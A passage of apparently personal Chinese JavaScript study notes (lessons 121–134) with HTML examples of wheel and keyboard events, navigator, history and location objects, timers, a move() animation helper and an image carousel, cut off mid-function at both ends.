id=&quot;btn01&quot;&gt;按钮01&lt;/button&gt; &lt;button id=&quot;btn02&quot;&gt;按钮02&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 121 滚轮事件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;滚轮的事件&lt;/title&gt; &lt;style&gt; #box1 &#123; width: 100px; height: 100px; background-color: #8080ff; &#125; &lt;/style&gt; &lt;script&gt; window.onload = function () &#123; /* 当滚轮向下滚动时，box1变长 当滚轮向上滚动时，box1变短 */ var box1 = document.getElementById(&quot;box1&quot;); // 为box1绑定一个鼠标滚动事件 /* onmousewheel鼠标滚轮滚动的事件，会在滚轮滚动时触发，但是火狐浏览器不支持该属性 在火狐中需要使用DOMMouseScroll来绑定滚动事件 注意该事件需要通过addEventListener()函数来绑定 */ box1.onmousewheel = function (event) &#123; event = event || window.event; // 判断滚轮滚动方向 /* event.wheelDelta 可以获取鼠标滚轮滚动的方向 向上滚动120，向下滚动-120 这个值不看大小，只看正负 event.wheelDelta属性火狐不支持，火狐中使用event.detail来获取滚动方向 向上-3，向下3 */ // 判断鼠标滚轮滚动的方向 if (event.wheelDelta &gt; 0 || event.detail &lt; 0) &#123; // 向上滚动，box1变短 box1.style.height += box1.clientHeight - 10; &#125; else &#123; // 向下滚动，box1边长 box1.style.height += box1.clientHeight + 10; &#125; /* 使用addEventListener()方法绑定响应函数，取消默认行为不能使用return false 需要使用event来取消默认行为 但是IE8不支持event.preventDefault();如果直接调用会报错 */ event.preventDefault || event.preventDefault(); /* 当滚轮滚动时，如果浏览器有滚动条，滚动条会随之滚动，这是浏览器的默认行为，如果不希望发生，则可以取消默认行为 */ return false; &#125;; // 为火狐绑定滚动事件 bind(box1, &quot;DOMMouseScroll&quot;, box1.onmousewheel); function bind(obj, eventStr, callback) &#123; if (obj.addEventListener) &#123; // 大部分浏览器兼容 obj.addEventListener(eventStr, callback, false); &#125; else &#123; obj.attachEvent(&quot;on&quot; + eventStr, function () &#123; // 在匿名函数中调用回调函数 callback.call(obj); &#125;); &#125; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body style=&quot;height:2000px;&quot;&gt; &lt;div id=&quot;box1&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 122 键盘事件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;键盘事件&lt;/title&gt; &lt;script&gt; window.onload = function () &#123; /* 键盘事件： onkeydown - 按键被按下 - 对于onkeydown来说，如果一直按着某个键不松开，则事件会一直连续触发 - onkeydown连续触发时，第一次和第二次之间间隔会非常大，其他的会非常快，这种设计是为了防止误操作 onkeyup - 按键被松开 键盘事件一般绑定给一些可以获取焦点的对象或者document */ // document.onkeydown = function (event) &#123; // event = event || window.event; // /* // 可以通过event.key获取按键的字符串 // keyCode已经弃用 // 事件对象中的其他几个属性： // alterKey // ctrlKey // shiftKey // - 这三个用来判断alt、ctrl、shift是否被按下，按下返回true，否则返回false // */ // console.log(event.key); // if (event.key == &quot; &quot;) &#123; // console.log(&quot;按下空格&quot;); // &#125; // /* // 判断一个y是否按下 // 判断y和ctrl是否同时按下 // */ // if (event.key === &quot;y&quot; &amp;&amp; event.ctrlKey) &#123; // console.log(&quot;同时按下ctrl和y&quot;); // &#125; // &#125; // document.onkeyup = function () &#123; // console.log(&quot;按键被松开！&quot;); // &#125; // 获取input var input = document.getElementsByTagName(&quot;input&quot;)[0]; var check = document.getElementById(&quot;check&quot;); input.onkeyup = function () &#123; console.log(this); /* 在文本框中输入内容，属于onkeydown的默认行为，如果在onkeydown中取消了默认行为，则输入的内容，不会出现在文本框中 return false; */ // 功能：文本框中只能输入数字 check.innerHTML = this.value.match(/\\D/) ? &quot;错误&quot; : &quot;正确&quot;; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;input type=&quot;text&quot; /&gt; &lt;span id=&quot;check&quot;&gt;&lt;/span&gt;&lt;/body&gt;&lt;/html&gt; 注意到底是绑定keydown还是keyup。 123 键盘移动div123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;键盘移动div&lt;/title&gt; &lt;style&gt; #box &#123; height: 100px; width: 100px; background-color: #8080ff; position: relative; &#125; &lt;/style&gt; &lt;script&gt; window.onload = function () &#123; var box = document.getElementById(&quot;box&quot;); document.onkeydown = function (event) &#123; event = event || window.event; // 获取当前位置 var x = box.offsetLeft; var y = box.offsetTop; console.log(box); switch (event.key) &#123; case &quot;ArrowLeft&quot;: box.style.left = x - 20 + &quot;px&quot;; break; case &quot;ArrowRight&quot;: box.style.left = x + 10 + &quot;px&quot;; break; case &quot;ArrowDown&quot;: box.style.top = y + 10 + &quot;px&quot;; break; case &quot;ArrowUp&quot;: box.style.top = y - 20 + &quot;px&quot;; break; &#125; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;box&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 124 Navigator1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;navigator&lt;/title&gt; &lt;script&gt; /* BOM - 浏览器对象模型 - BOM可以使我们通过JS来操作浏览器 - 在BOM中为我们提供了一组对象，用来完成对浏览器的操作 Window - 代表的是整个浏览器 Navigator - 代表的是当前浏览器的信息，通过该对象可以识别不同的浏览器 Location - 代表当前浏览器的地址栏信息，通过Location可以获取地址栏信息，或者操作浏览器跳转页面 History - 代表的浏览器的历史记录，可以通过该对象来操作浏览器向前或向后翻页 而且该操作只在当次访问有效 Screen - 代表的是用户屏幕的信息，通过该对象可以获取到用户显示器的相关信息 这些BOM对象在浏览器中都是作为window对象的属性保存的。 可以通过window对象来使用，也可以直接使用 */ console.log(navigator, window.navigator); console.log(location, window.location); console.log(history, window.history); console.log(screen, window.screen); /* Navigator - 代表的当前浏览器的信息，通过该对象可以识别不同的浏览器 - 由于历史原因，Navigator中大部分属性都已经不能帮助我们识别浏览器了 - 一般我们只会使用userAgent来判断浏览器的信息 userAgent是一个字符串，这个字符串中包含有用来描述浏览器信息的内容，不同的浏览器会有不同的userAgent */ console.log(navigator.appName);// EDGE-Netscape chrome-Netscape console.log(navigator.userAgent); /* EDGE Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50 Chrome Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 IE11 Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko */ // 使用正则匹配即可 /* 如果通过UserAgent不能判断，还可以通过一些浏览器特有的对象，来判断浏览器的信息 比如： ActiveXObject IE特有（IE8-11都有，8-10 window.ActiveObject返回true，但是IE11返回false,有一说一真恶心） 所以需要使用(&quot;ActiveXObject&quot; in window) 来判断 */ &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 125 history1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;History&lt;/title&gt; &lt;script&gt; window.onload = function () &#123; /* History - 对象可以用来操作了浏览器向前或者向后翻页 history.length属性可以获取到当前访问的链接数量 */ console.log(history); console.log(history.length); var btn1 = document.getElementsByTagName(&quot;button&quot;)[0]; var btn2 = document.getElementsByTagName(&quot;button&quot;)[1]; btn1.onclick = function () &#123; /* back() - 用来回退到上一个页面，作用与浏览器的回退按钮一致。 */ history.back(); &#125; btn2.onclick = function () &#123; /* forward() - 用来跳转到下一个页面，作用与前进按钮一致。 */ history.forward(); &#125; /* go - 可以用来跳转到指定的页面 - 它需要一个整数作为参数 1.表示向前跳转一个页面 2.表示向前跳转两个页面 -1.表示向后跳转一个页面 -2.表示向后跳转两个页面 */ &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;测试History&lt;/h1&gt; &lt;button&gt;跳转回上一个页面&lt;/button&gt; &lt;button&gt;跳转到下一个页面&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 126 location1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Location&lt;/title&gt; &lt;script&gt; window.onload = function () &#123; /* Location对象 - 该对象中封装了浏览器中地址栏的信息 */ var btn1 = document.getElementsByTagName(&quot;button&quot;)[0]; btn1.onclick = function () &#123; // 如果直接打印location，则可以获取到地址栏的信息（当前页面的完整路径） console.log(location); /* 如果直接将location属性修改为一个完整的路径，或相对路径，则页面回自动跳转到该路径，并会生成相应的历史记录 */ // location = `https://miketaylorjuly123.cn`; /* assign - 用来跳转到其他的页面，作用和直接修改location一样 */ location.assign(&quot;https://miketaylorjuly123.cn&quot;); /* reload() - 用于重新加载当前文档，作用与刷新按钮一致，但是火狐会有缓存，可以通过指定参数true进行强制清空缓存刷新 - 如果在方法中传递一个参数true，作为参数，则会强制清空缓存刷新页面 */ // location.reload(true); /* replace - 可以使用一个新的页面来替换当前页面，调用完毕后也会跳转页面 - 但是注意，他不会生成历史记录，无法进行回退 */ // location.replace(&quot;https://miketaylorjuly123.cn&quot;); &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Location&lt;/h1&gt; &lt;button&gt;测试&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 127 定时器简介12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;定时器简介&lt;/title&gt; &lt;style&gt; &lt;/style&gt; &lt;script&gt; /* setInterval() - 开启定时器，可以将一个函数每隔一段时间执行一次 - 可以将一个函数，每隔一段时间执行一次 - 参数： - 1.回调函数，该函数会每隔一段时间被调用一次 2.每次调用间隔的时间，单位为毫秒 - 返回值 返回一个Number类型的数据 返回值用来作为定时器的唯一标识 clearInterval() - 用于关闭定时器 - 方法中需要一个定时器的标识作为参数，这样将关闭标识对应的定时器 */ window.onload = function () &#123; // 获取count var count = document.getElementById(&quot;count&quot;); // 使count中的内容自动切换 /* 如果希望一段程序每间隔一段时间调用，可以使用定时器调用 */ var num = 1; var timer = setInterval(function () &#123; count.innerHTML = num++; if (num == 99) &#123; count.innerHTML = &quot;羽川翼！&quot;; clearInterval(timer); &#125; &#125;, 20); &#125;; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h2 id=&quot;count&quot;&gt;1&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; 128 切换图片练习12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;切换图片练习&lt;/title&gt; &lt;script&gt; var imgArray = [&quot;./img/1.png&quot;, &quot;./img/2.png&quot;, &quot;./img/3.png&quot;, &quot;./img/4.png&quot;]; var index = 0; var timer; window.onload = function () &#123; var img = document.getElementsByTagName(&quot;img&quot;)[0]; var btn01 = document.getElementsByTagName(&quot;button&quot;)[0]; var btn02 = document.getElementsByTagName(&quot;button&quot;)[1]; btn01.onclick = function () &#123; /* 每点击一次就会开启一个定时器，而且定时器标识被覆盖，导致关不掉除最后一个定时器外的定时器 */ // 开启定时器之前，需要停止当前元素上的其他定时器 clearInterval(timer); timer = setInterval(() =&gt; &#123; index = (index + 1) % imgArray.length; img.src = imgArray[index]; &#125;, 3000); btn02.onclick = function () &#123; // 点击按钮后，停止图片的自动切换，关闭定时器 /* clearInterval()可以接收任意的参数 如果参数是一个有效的定时器标识，则停止对应的定时器 如果参数不是一个有效的标识，则什么也不会发生，不会报错 */ clearInterval(timer); console.log(timer); &#125; &#125; &#125; &lt;/script&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; div &#123; width: 600px; margin: 0 auto; &#125; img &#123; width: 100%; &#125; button:last-child &#123; float: right; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt; &lt;img src=&quot;./img/1.png&quot; alt=&quot;&quot;&gt; &lt;button id=&quot;btn01&quot;&gt;开始&lt;/button&gt; &lt;button id=&quot;btn02&quot;&gt;暂停&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 129 修改div练习123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;键盘移动div&lt;/title&gt; &lt;style&gt; #box &#123; height: 100px; width: 100px; background-color: #8080ff; position: relative; &#125; &lt;/style&gt; &lt;script&gt; window.onload = function () &#123; /* 问题：长按后，连续移动前有明显的卡顿情况 */ var box = document.getElementById(&quot;box&quot;); // 创建一个变量表示方向 var direction = null; // 通过修改dir来影响移动的方向 setInterval(() =&gt; &#123; switch (direction) &#123; case &quot;ArrowLeft&quot;: box.style.left = box.offsetLeft - 20 + &quot;px&quot;; break; case &quot;ArrowRight&quot;: box.style.left = box.offsetLeft + 10 + &quot;px&quot;; break; case &quot;ArrowDown&quot;: box.style.top = box.offsetTop + 10 + &quot;px&quot;; break; case &quot;ArrowUp&quot;: box.style.top = box.offsetTop - 20 + &quot;px&quot;; break; &#125; &#125;, 30); document.onkeydown = function (event) &#123; event = event || window.event; // 获取当前位置 direction = event.key; &#125; document.onkeyup = function () &#123; direction = null; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;box&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 130 延时调用12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;延时调用&lt;/title&gt; &lt;script&gt; var num = 1; // 开启定时器 setInterval(function () &#123; console.log(num++); &#125;, 3000); /* setTimeout - 延时调用：一个函数不是马上执行，而是隔一段时间执行，而且只会执行一次 - 定时调用执行多次，延时调用执行一次 延时调用和定时调用实际上是可以相互转换代替的，开发中可以根据自己的需要选择 */ var timer = setInterval(function () &#123; console.log(num++); &#125;, 3000); // 使用clearTimeout()来关闭一个延时调用 clearTimeout(timer); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 131 定时器的应用(一)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; * &#123; margin: 0; padding: 0; &#125; #box1 &#123; width: 100px; height: 100px; background-color: red; position: absolute; left: 0; &#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; //获取box1 var box1 = document.getElementById(&quot;box1&quot;); //获取btn01 var btn01 = document.getElementById(&quot;btn01&quot;); //定义一个变量，用来保存定时器的标识 var timer; //点击按钮以后，使box1向右移动（left值增大） btn01.onclick = function () &#123; //关闭上一个定时器 clearInterval(timer); //开启一个定时器，用来执行动画效果 timer = setInterval(function () &#123; //获取box1的原来的left值 var oldValue = parseInt(getStyle(box1, &quot;left&quot;)); //在旧值的基础上增加 var newValue = oldValue + 10; //判断newValue是否大于800 if (newValue &gt; 800) &#123; newValue = 800; &#125; //将新值设置给box1 box1.style.left = newValue + &quot;px&quot;; //当元素移动到800px时，使其停止执行动画 if (newValue == 800) &#123; //达到目标，关闭定时器 clearInterval(timer); &#125; &#125;, 30); &#125;; &#125;; /* * 定义一个函数，用来获取指定元素的当前的样式 * 参数： * obj 要获取样式的元素 * name 要获取的样式名 */ function getStyle(obj, name) &#123; if (window.getComputedStyle) &#123; //正常浏览器的方式，具有getComputedStyle()方法 return getComputedStyle(obj, null)[name]; &#125; else &#123; //IE8的方式，没有getComputedStyle()方法 return obj.currentStyle[name]; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button id=&quot;btn01&quot;&gt;点击按钮以后box1向右移动&lt;/button&gt; &lt;br /&gt;&lt;br /&gt; &lt;div id=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div style=&quot;width: 0; height: 1000px; border-left:1px black solid; position: absolute; left: 800px;top:0;&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 132 定时器的应用（三）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin: 0; padding: 0; &#125; #box1&#123; width: 100px; height: 100px; background-color: red; position: absolute; left: 0; &#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function()&#123; //获取box1 var box1 = document.getElementById(&quot;box1&quot;); //获取btn01 var btn01 = document.getElementById(&quot;btn01&quot;); //获取btn02 var btn02 = document.getElementById(&quot;btn02&quot;); //点击按钮以后，使box1向右移动（left值增大） btn01.onclick = function()&#123; move(box1 , 800 , 10); &#125;; //点击按钮以后，使box1向左移动（left值减小） btn02.onclick = function()&#123; move(box1 , 0 , 10); &#125;; &#125;; //定义一个变量，用来保存定时器的标识 var timer; //尝试创建一个可以执行简单动画的函数 /* * 参数： * obj:要执行动画的对象 * target:执行动画的目标位置 * speed:移动的速度(正数向右移动，负数向左移动) */ function move(obj , target ,speed)&#123; //关闭上一个定时器 clearInterval(timer); //获取元素目前的位置 var current = parseInt(getStyle(obj,&quot;left&quot;)); //判断速度的正负值 //如果从0 向 800移动，则speed为正 //如果从800向0移动，则speed为负 if(current &gt; target)&#123; //此时速度应为负值 speed = -speed; &#125; //开启一个定时器，用来执行动画效果 timer = setInterval(function()&#123; //获取box1的原来的left值 var oldValue = parseInt(getStyle(obj,&quot;left&quot;)); //在旧值的基础上增加 var newValue = oldValue + speed; //判断newValue是否大于800 //从800 向 0移动 //向左移动时，需要判断newValue是否小于target //向右移动时，需要判断newValue是否大于target if((speed &lt; 0 &amp;&amp; newValue &lt; target) || (speed &gt; 0 &amp;&amp; newValue &gt; target))&#123; newValue = target; &#125; //将新值设置给box1 obj.style.left = newValue + &quot;px&quot;; //当元素移动到0px时，使其停止执行动画 if(newValue == target)&#123; //达到目标，关闭定时器 clearInterval(timer); &#125; &#125;,30); &#125; /* * 定义一个函数，用来获取指定元素的当前的样式 * 参数： * obj 要获取样式的元素 * name 要获取的样式名 */ function getStyle(obj , name)&#123; if(window.getComputedStyle)&#123; //正常浏览器的方式，具有getComputedStyle()方法 return getComputedStyle(obj , null)[name]; &#125;else&#123; //IE8的方式，没有getComputedStyle()方法 return obj.currentStyle[name]; &#125; &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button id=&quot;btn01&quot;&gt;点击按钮以后box1向右移动&lt;/button&gt; &lt;button id=&quot;btn02&quot;&gt;点击按钮以后box1向左移动&lt;/button&gt; &lt;br /&gt;&lt;br /&gt; &lt;div id=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div style=&quot;width: 0; height: 1000px; border-left:1px black solid; position: absolute; left: 800px;top:0;&quot;&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 133 定时器的应用（三）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin: 0; padding: 0; &#125; #box1&#123; width: 100px; height: 100px; background-color: red; position: absolute; left: 0; &#125; #box2&#123; width: 100px; height: 100px; background-color: yellow; position: absolute; left: 0; top: 200px; &#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;js/tools.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function()&#123; //获取box1 var box1 = document.getElementById(&quot;box1&quot;); //获取btn01 var btn01 = document.getElementById(&quot;btn01&quot;); //获取btn02 var btn02 = document.getElementById(&quot;btn02&quot;); //点击按钮以后，使box1向右移动（left值增大） btn01.onclick = function()&#123; move(box1 ,&quot;left&quot;, 800 , 20); &#125;; //点击按钮以后，使box1向左移动（left值减小） btn02.onclick = function()&#123; move(box1 ,&quot;left&quot;, 0 , 10); &#125;; //获取btn03 var btn03 = document.getElementById(&quot;btn03&quot;); btn03.onclick = function()&#123; move(box2 , &quot;left&quot;,800 , 10); &#125;; //测试按钮 var btn04 = document.getElementById(&quot;btn04&quot;); btn04.onclick = function()&#123; //move(box2 ,&quot;width&quot;, 800 , 10); //move(box2 ,&quot;top&quot;, 800 , 10); //move(box2 ,&quot;height&quot;, 800 , 10); move(box2 , &quot;width&quot; , 800 , 10 , function()&#123; move(box2 , &quot;height&quot; , 400 , 10 , function()&#123; move(box2 , &quot;top&quot; , 0 , 10 , function()&#123; move(box2 , &quot;width&quot; , 100 , 10 , function()&#123; &#125;); &#125;); &#125;); &#125;); &#125;; &#125;; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button id=&quot;btn01&quot;&gt;点击按钮以后box1向右移动&lt;/button&gt; &lt;button id=&quot;btn02&quot;&gt;点击按钮以后box1向左移动&lt;/button&gt; &lt;button id=&quot;btn03&quot;&gt;点击按钮以后box2向右移动&lt;/button&gt; &lt;button id=&quot;btn04&quot;&gt;测试按钮&lt;/button&gt; &lt;br /&gt;&lt;br /&gt; &lt;div id=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div id=&quot;box2&quot;&gt;&lt;/div&gt; &lt;div style=&quot;width: 0; height: 1000px; border-left:1px black solid; position: absolute; left: 800px;top:0;&quot;&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172//尝试创建一个可以执行简单动画的函数/* * 参数： * obj:要执行动画的对象 * attr:要执行动画的样式，比如：left top width height * target:执行动画的目标位置 * speed:移动的速度(正数向右移动，负数向左移动) * callback:回调函数，这个函数将会在动画执行完毕以后执行 */function move(obj, attr, target, speed, callback) &#123; //关闭上一个定时器 clearInterval(obj.timer); //获取元素目前的位置 var current = parseInt(getStyle(obj, attr)); //判断速度的正负值 //如果从0 向 800移动，则speed为正 //如果从800向0移动，则speed为负 if(current &gt; target) &#123; //此时速度应为负值 speed = -speed; &#125; //开启一个定时器，用来执行动画效果 //向执行动画的对象中添加一个timer属性，用来保存它自己的定时器的标识 obj.timer = setInterval(function() &#123; //获取box1的原来的left值 var oldValue = parseInt(getStyle(obj, attr)); //在旧值的基础上增加 var newValue = oldValue + speed; //判断newValue是否大于800 //从800 向 0移动 //向左移动时，需要判断newValue是否小于target //向右移动时，需要判断newValue是否大于target if((speed &lt; 0 &amp;&amp; newValue &lt; target) || (speed &gt; 0 &amp;&amp; newValue &gt; target)) &#123; newValue = target; &#125; //将新值设置给box1 obj.style[attr] = newValue + &quot;px&quot;; //当元素移动到0px时，使其停止执行动画 if(newValue == target) &#123; //达到目标，关闭定时器 clearInterval(obj.timer); //动画执行完毕，调用回调函数 callback &amp;&amp; callback(); &#125; &#125;, 30);&#125;/* * 定义一个函数，用来获取指定元素的当前的样式 * 参数： * obj 要获取样式的元素 * name 要获取的样式名 */function getStyle(obj, name) &#123; if(window.getComputedStyle) &#123; //正常浏览器的方式，具有getComputedStyle()方法 return getComputedStyle(obj, null)[name]; &#125; else &#123; //IE8的方式，没有getComputedStyle()方法 return obj.currentStyle[name]; &#125;&#125; 134 轮播图——自动放映（自己实现）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;轮播图&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; #container &#123; /* 设置宽高 ，需要设置动态*/ width: 361px; height: 200px; /* 居中 */ margin: 50px auto; background-color: #8080ff; padding: 10px 0; /* 开启相对定位 */ position: relative; overflow: hidden; &#125; #imgList &#123; /* 设置ul宽度 ，写死了不好，需要设置动态*/ /* width: 1444px; */ /* 开启相对定位 */ position: absolute; left: 0px; &#125; li &#123; height: 200px; float: left; list-style: none; /* 设置左右边距 */ margin: 0 20px; &#125; li img &#123; height: 100%; &#125; &lt;/style&gt; &lt;script&gt; window.onload = function () &#123; var imgList = document.getElementById(&quot;imgList&quot;); var container = document.getElementById(&quot;container&quot;); var imgs = document.getElementsByTagName(&quot;img&quot;); /* 设置动态长度 */ imgList.style.width = 361 * imgs.length + &quot;px&quot;; imgList.style.left = 0 + &quot;px&quot;; /* 每向左移动361px，就会显示下一张图片 */ var timer; var index = 0; var speed = 10; var positionLeft; var flag = true; setInterval(() =&gt; &#123; clearInterval(timer); if (index != imgs.length - 1 &amp;&amp; flag == true) &#123; console.log(&quot;##&quot; + imgList.style.left); positionLeft = -361 * (++index % imgs.length); timer = setInterval(() =&gt; &#123; imgList.style.left = (parseInt(getStyle(imgList, &quot;left&quot;)) - speed) + &quot;px&quot;; if (positionLeft &gt; parseInt(getStyle(imgList, &quot;left&quot;))) &#123; imgList.style.left = -361 * (index % imgs.length) + &quot;px&quot;; clearInterval(timer); &#125; &#125;, 10); &#125; else &#123; console.log(&quot;@@&quot; + imgList.style.left); flag = false; positionLeft = -361 * (--index % imgs.length); timer = setInterval(() =&gt; &#123; imgList.style.left = (parseInt(getStyle(imgList, &quot;left&quot;)) + speed) + &quot;px&quot;; if (positionLeft &lt; parseInt(getStyle(imgList, &quot;left&quot;))) &#123; imgList.style.left = -361 * (index % imgs.length) + &quot;px&quot;; if (index == 0) &#123; flag = true; &#125; clearInterval(timer); &#125; &#125;, 10); &#125; &#125;, 1000) &#125; function getStyle(obj, name) &#123; // 正常浏览器的方式，具有getComputedStyle()方法 if 